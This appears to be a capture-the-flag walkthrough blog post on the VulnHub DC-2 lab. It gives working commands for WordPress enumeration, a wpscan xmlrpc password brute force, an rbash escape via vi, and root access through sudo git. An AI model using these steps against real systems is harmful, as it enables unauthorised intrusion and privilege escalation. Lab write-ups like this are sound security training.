---
layout: post
author: H4
---

[Details](https://www.vulnhub.com/entry/dc-2,311/)

# enumeration
Performing a simple `nmap` scan to identify the attack surface.

## nmap
```bash
nmap -Pn -p80,7744 -sV  192.168.239.194 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-08 04:31 EDT
Nmap scan report for dc-2 (192.168.239.194)
Host is up (0.026s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.37 seconds
```

## gobuster
Using `gobuster` to look for hidden files on the identified web server.

```bash
gobuster dir -u http://dc-2/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -t 10 -x php -b 404,403
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dc-2/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/05/08 03:59:37 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 301) [Size: 0] [--> http://dc-2/]
/xmlrpc.php           (Status: 405) [Size: 42]                  
/wp-login.php         (Status: 200) [Size: 2165]                
/readme.html          (Status: 200) [Size: 7413]                
/license.txt          (Status: 200) [Size: 19935]               
/wp-config.php        (Status: 200) [Size: 0]                   
/wp-trackback.php     (Status: 200) [Size: 135]                 
/wp-settings.php      (Status: 500) [Size: 0]                   
/wp-cron.php          (Status: 200) [Size: 0]                   
/wp-blog-header.php   (Status: 200) [Size: 0]                   
/wp-links-opml.php    (Status: 200) [Size: 215]                 
/wp-load.php          (Status: 200) [Size: 0]                   
/wp-signup.php        (Status: 302) [Size: 0] [--> http://dc-2/wp-login.php?action=register]
/wp-activate.php      (Status: 302) [Size: 0] [--> http://dc-2/wp-login.php?action=register]
                                                                                            
===============================================================
2022/05/08 04:01:42 Finished
===============================================================
```

> It seems that `wordpress` is installed on the web server. `wpscan` reveals that wordpress version `4.7.10` is used and outdated.
{: .prompt-tip }

---

# exploitation
## wordpress
Looking for exploits against `wordpress 4.7.10`

```bash
searchsploit wordpress Core 4.7
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                |  Path
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Core 4.7.0/4.7.1 - Content Injection                                                                                                | linux/webapps/41223.py
WordPress Core 4.7.0/4.7.1 - Content Injection (Ruby)                                                                                         | linux/webapps/41224.rb
WordPress Core < 4.7.1 - Username Enumeration                                                                                                 | php/webapps/41497.php
WordPress Core < 4.7.4 - Unauthorized Password Reset                                                                                          | linux/webapps/41963.txt
WordPress Core < 4.9.6 - (Authenticated) Arbitrary File Deletion                                                                              | php/webapps/44949.txt
WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts                                                                       | multiple/webapps/47690.md
WordPress Core < 5.3.x - 'xmlrpc.php' Denial of Service                                                                                       | php/dos/47800.py
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
- `WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts` looks promising  
- `http://dc-2/?static=1&order=asc` reveals the 'secret' content  
  
> The site gives the hint that `cewl` might be a good idea. `cewl` generates custom wordlists it scrapes from the website you provide.
{: .prompt-tip }

```bash
cewl -d 2 -w ourWordlist.txt "http://dc-2/?static=1&order=asc"
```

Then we are using `wpscan` to identify accounts on the `wordpress` site and perform a brute force attack with the generated wordlist.  
> We are using the `xmlrpc` endpoint here instead of the 'normal' login page, because in this way we can perform multiple login attemps with one xml-rpc call.
{: .prompt-info }

```bash
wpscan --url http://dc-2/ --password-attack xmlrpc -P /home/void/Documents/web200/playgrounds/dc2/ourWordlist.txt                                                      
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.18
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://dc-2/ [192.168.239.194]
[+] Started: Sun May  8 04:16:03 2022
...
[+] Performing password attack on Xmlrpc against 3 user/s
[SUCCESS] - jerry / adipiscing 
[SUCCESS] - tom / parturient                                                                                                                                                    
Trying admin / Powered Time: 00:01:23 <=====================================================                                                > (780 / 1458) 53.49%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: jerry, Password: adipiscing
 | Username: tom, Password: parturient
...
```
Yay! we got two valid credentials for the `wordpress` instance.  
> Unfortunately both accounts cannot be used to upload a `plugin` or escalate to an `rce`.  
{: .prompt-danger }

## ssh
On port 7744 there is a `SSH` service
> logging in with `tom:parturient` works
{: .prompt-tip }

```bash
ssh tom@dc-2 -p 7744                                                                                                                                                  
The authenticity of host '[dc-2]:7744 ([192.168.239.194]:7744)' can't be established.
ED25519 key fingerprint is SHA256:JEugxeXYqsY0dfaV/hdSQN31Pp0vLi5iGFvQb8cB1YA.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[dc-2]:7744' (ED25519) to the list of known hosts.
tom@dc-2's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
tom@DC-2:~$ ls
flag3.txt  local.txt  usr
tom@DC-2:~$ cat local.txt
-rbash: cat: command not found
```

> `rbash` is in place and the program `cat` cannot be found. `rbash` is a restricted shell which is used to jail a user, so he cannot execute certain commands and act as a normal user.
{: .prompt-danger }

## escaping rbash
```bash
tom@DC-2: vi
:set shell=/bin/bash
:shell
tom@DC-2:~$ cat local.txt
bash: cat: command not found
```
Yay! We escaped `rbash` but cat is still not available.

## cat alternative to get the first flag
```bash
tom@DC-2:~$ less local.txt
```
-> `9******************************c`

## privilege escalation
Try to identify if the user `tom` is able to execute commands as a super user.

```bash
echo $PATH
/home/tom/usr/bin
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
tom@DC-2:/var/www/html$ sudo -l
[sudo] password for tom: 
Sorry, user tom may not run sudo on DC-2.
```

As `tom` is not allowed to do so, we are switching to the other user we know and check if this one is able to perform commands as a super user.

```
tom@DC-2:~$ su jerry
Password: 
jerry@DC-2:/home/tom$ sudo -l
Matching Defaults entries for jerry on DC-2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jerry may run the following commands on DC-2:
    (root) NOPASSWD: /usr/bin/git
```

Checking [gtfobins](https://gtfobins.github.io/) to identify how we can exploit `git` to gain root access

```
sudo git -p help config
...
!/bin/sh
# cd /root
# ls
final-flag.txt  proof.txt
# less proof.txt
6******************************7
```
-> `6******************************7`  
  
Pwned! <@:-)
